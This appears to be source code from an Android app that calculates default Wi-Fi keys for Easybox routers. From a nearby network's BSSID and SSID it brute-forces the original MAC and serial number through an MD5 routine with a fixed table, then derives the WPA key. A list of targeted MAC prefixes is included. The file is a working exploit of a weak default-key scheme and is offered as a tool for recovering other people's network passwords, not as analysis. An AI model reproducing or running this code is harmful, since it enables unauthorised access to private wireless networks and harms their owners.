package de.warker.ezwlan.handler;

import android.net.wifi.ScanResult;
import android.util.Log;

import java.security.MessageDigest;
import java.util.LinkedList;
import java.util.List;

/**
 * Created by warker on 09.02.15.
 */
public class EasyboxNewWlanKeyHandler extends ArcadyanWlanKeyHandler {

    private final byte[] pre_heat = new byte[]{
            0x1F, 0x17, 0x0F, 0x13,
            0x1D, 0x06, 0x27, 0x04,
            0x07, 0x16, 0x24, 0x0C,
            0x12, 0x08, 0x25, 0x11,
            0x20, 0x1E, 0x10, 0x18,
            0x0D, 0x19, 0x22, 0x01,
            0x15, 0x1B, 0x21, 0x1C,
            0x03, 0x26, 0x14, 0x0E,
            0x05, 0x02, 0x00, 0x15,
            0x09, 0x0A, 0x0B, 0x23};

    private MessageDigest Md5;

    public EasyboxNewWlanKeyHandler(){

        try {
            Md5 = MessageDigest.getInstance("MD5");
        }
        catch (Exception e) {
            //Can't create Message Digest! This shouldn't happen! really
        }


        // checked
        SUPPORTED_MACS.add("02:26:4D");
        SUPPORTED_MACS.add("76:31:70");

        // possible
        SUPPORTED_MACS.add("8A:25:2C");
        SUPPORTED_MACS.add("7E:4F:B5");
        SUPPORTED_MACS.add("1E:C6:3C");

        //unchecked
        SUPPORTED_MACS.add("02:23:08");
        SUPPORTED_MACS.add("52:7E:5D");
        SUPPORTED_MACS.add("02:12:BF");
        SUPPORTED_MACS.add("02:1A:2A");
        SUPPORTED_MACS.add("02:1D:19");
        SUPPORTED_MACS.add("90:25:2C");

        SUPPORTED_SSID.add("easybox");
    }

    private String calcNewMac(String old_mac, String serial_number){
        //arraycopy(Object src, int srcPos, Object dest, int destPos, int length)
        //pre_heat.put(serial_number.getBytes(), 6, 4);
        /*
        pre_heat[6:15] = '%s%05d' % (serial_number[0:4], int(old_mac[8:], 16)) # serial
        pre_heat[17:23] = old_mac[6:] # fuege alte MAC ein
        res = hashlib.md5(pre_heat).hexdigest() # MD5 hashing
        return '%02X%s%s%s%s' %(int(old_mac[0:2], 16)+2,
                            old_mac[2:6],
                            res[8:10].upper(),
                            res[16:18].upper(),
                            res[28:30].upper())
         */
        System.arraycopy(serial_number.getBytes(), 0, pre_heat, 6, 4);
        //pre_heat.put(String.format("%05d", Integer.parseInt(old_mac.substring(8), 16)).getBytes(), 10, 4);
        System.arraycopy(String.format("%05d", Integer.parseInt(old_mac.substring(8), 16)).getBytes(), 0,
                pre_heat, 10, 5);
        //pre_heat.put(old_mac.toUpperCase().substring(6).getBytes(), 17, 6);
        System.arraycopy(old_mac.toUpperCase().substring(6).getBytes(), 0,
                pre_heat, 17, 6);

        Md5.reset();
        byte[] digest_data = Md5.digest(pre_heat);

        return String.format("%02X%s%02X%02X%02X",
                Integer.parseInt(old_mac.substring(0,2), 16)+2,
                old_mac.substring(2, 6),
                digest_data[4],
                digest_data[8],
                digest_data[14]);
    }

    protected String[] calcKeys(String bssid, String ssid){
        //Log.d("EZWLAN", "calcKeys("+bssid+", "+ssid+")");
        final List<String> keylist = new LinkedList<String>();
        if(ssid.matches("^EASYBOX-[0-9A-F]{4}[0-9]{2}")){
            String mac_prefix = String.format("%02X%s%s",
                    Byte.parseByte(bssid.substring(0, 2), 16) - 0x2, // first octet - 2
                    bssid.substring(2, 6),                         // 2nd & 3rd octet is the same
                    ssid.substring(8, 12));                         // 4th and 5th octet from old ssid
            int start = Integer.parseInt(ssid.substring(10, 12)+ "00", 16);
            for(int i = 0; i <= 0xff; ++i){
                int t = start + i;
                if( (t / 10000) == Integer.parseInt(ssid.substring(12, 13))
                        && (t % 10) == Integer.parseInt(ssid.substring(13)) ){
                    String old_mac_candidate = String.format("%s%02X", mac_prefix, i);
                    Log.d("EZWLAN", "MAC-Candidate: " + old_mac_candidate);
                    for(int j = 0; j < 10000; ++j) {
                        if (bssid.equalsIgnoreCase(calcNewMac(old_mac_candidate, String.format("%04d", j)))) {
                            keylist.add(super.calcKey(old_mac_candidate));
                            Log.d("EZWLAN", "HIT " + old_mac_candidate);
                        }
                    }
                }
            }
            Log.d("EZWLAN", "Seek finished!");
            return keylist.toArray(new String[keylist.size()]);
        }
        else {
            // Todo: ERROR Message goes here - ssid Easybox is mendatory
            return null;
        }
    }

    @Override
    public String[] getKeys(ScanResult sr) {
        return calcKeys(HandlerFactory.bssid_helper(sr.BSSID).toUpperCase(),
                sr.SSID.toUpperCase());
    }
}
